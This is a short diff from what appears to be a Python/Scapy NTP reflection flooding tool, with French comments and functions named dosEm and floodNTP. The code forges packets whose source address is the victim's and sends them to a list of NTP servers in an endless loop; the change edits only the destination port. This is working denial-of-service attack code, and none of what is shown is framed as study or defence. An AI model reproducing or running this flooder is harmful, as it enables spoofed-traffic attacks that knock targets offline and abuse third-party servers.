@@ -35,7 +35,7 @@ def dosEm(target, ntplist, data, currentserver):
         Fonction qui construit un paquet et qui l'envoie
         """
         ntpserver = ntplist[currentserver] #LOAD THE SERVER
-        packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) #CONSTRUIRE LE PAQUER
+        packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=1203)/Raw(load=data) #CONSTRUIRE LE PAQUER
         send(packet,loop=1) #ENVOYER 
 
 def floodNTP(numberthreads, targget):
